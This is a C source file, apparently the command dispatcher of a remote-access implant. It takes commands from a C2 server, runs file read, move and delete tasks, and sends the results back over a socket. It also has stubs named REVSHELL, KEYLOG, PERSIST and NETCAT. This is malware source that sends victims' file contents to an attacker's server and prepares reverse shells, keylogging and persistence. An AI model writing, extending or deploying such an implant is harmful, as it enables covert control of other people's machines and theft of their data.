//
// Created by melo on 4/8/25.
//

#include "choice.h"
#include "tasks.h"
#include "connexion.h"

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>  // For NULL
#include <unistd.h>  // For close

void choice(char * buffer_fetch, char * user_ID) {
    char buffer[1024];
    strcpy(buffer, buffer_fetch); // Create a copy to avoid modifying original

    char * command = strtok(buffer, ",");
    char * task_result = malloc(1024 * 1024); // Allocate large buffer for results
    if (task_result == NULL) {
        perror("Memory allocation failed");
        return;
    }
    task_result[0] = '\0'; // Initialize as empty string

    char * task_ID = NULL;

    if (strcmp(command, "SLEEP") == 0) {
        task_ID = sleep_task(buffer_fetch, task_result);
        if (task_ID != NULL) {
            task_result[0] = '\0';
        }
    }
    else if (strcmp(command, "CAT") == 0) {
        task_ID = cat_task(buffer_fetch, task_result);
        if (task_ID != NULL) {
            printf("Cat task completed, task ID: %s\n", task_ID);
            printf("Result length: %zu bytes\n", strlen(task_result));
        }
    }
    else if (strcmp(command, "EXECVE") == 0) {
        printf("EXECVE command received\n");
    }
    else if (strcmp(command, "LOCATE") == 0) {
        printf("LOCATE command received\n");
    }
    else if (strcmp(command, "REVSHELL") == 0) {
        printf("REVSHELL command received\n");
    }
    else if (strcmp(command, "KEYLOG") == 0) {
        printf("KEYLOG command received\n");
    }
    else if (strcmp(command, "PERSIST") == 0) {
        printf("PERSIST command received\n");
    }
    else if (strcmp(command, "MV") == 0) {
    	task_ID = mv_task(buffer_fetch);
    	if (task_ID != NULL) {
        	task_result[0] = '\0';
    }
}
    else if (strcmp(command, "RM") == 0) {
        task_ID = rm_task(buffer_fetch);
    	if (task_ID != NULL) {
        	task_result[0] = '\0';
    	}
    }
    else if (strcmp(command, "PS") == 0) {
        printf("PS command received\n");
    }
    else if (strcmp(command, "NETCAT") == 0) {
        printf("NETCAT command received\n");
    }
    else {
        printf("Unknown command: %s\n", command);
    }

    // Here you would send the results back to the C2 server
    // Format: RESULT,task_ID,user_ID,task_result (base64)
    if (task_ID != NULL) {
        printf("Task completed - User ID: %s, Task ID: %s\n", user_ID, task_ID);

        // Create a response message for the C2 server
        char *response = malloc(1024 * 1024 + 512); // Allocate large buffer for response
        if (response == NULL) {
            perror("Memory allocation failed for response");
            free(task_ID);
            free(task_result);
            return;
        }

        // Format the response: RESULT,task_ID,user_ID,task_result
        snprintf(response, 1024 * 1024 + 512, "RESULT,%s,%s,%s\n", user_ID, task_ID, task_result);

        // Open a new socket connection to the C2 server
        int sock_result = sock_init();
        if (sock_result != -1) {
            char buffer_response[1024] = {0};
            send_message(sock_result, response, buffer_response);
            printf("Result sent to server, response: %s\n", buffer_response);
            close(sock_result);
        } else {
            printf("Failed to send result to server\n");
        }

        free(response);
        free(task_ID); // Free the task_ID allocated by the task function
    }

    free(task_result);
}